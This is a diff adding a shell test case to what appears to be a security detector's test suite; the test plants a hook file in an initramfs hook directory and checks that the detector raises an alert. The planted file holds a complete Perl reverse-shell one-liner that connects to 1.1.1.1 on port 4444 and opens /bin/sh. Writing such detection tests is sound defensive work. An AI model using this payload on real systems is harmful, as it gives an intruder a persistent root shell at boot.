@@ -271,3 +271,20 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl reverse-shell variant — interpreter-rev-shell axis sister to python on initramfs hook surface)" {
+    # Sister to the python -c interpreter-rev-shell INVARIANT
+    # just above. Perl is the OTHER scripting interpreter
+    # commonly present in initramfs images (busybox builds
+    # often include perl for udev/busybox-perl fallback).
+    # An attacker may swap python→perl to dodge a python-only
+    # detector. Locks the perl axis on the early-boot root-exec
+    # persistence surface (T1542/T1546 — same trigger
+    # surface as the python axis).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e \"use Socket;\\$i=\\\"1.1.1.1\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");\"\n' > "${HOOKD}/cryptroot"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
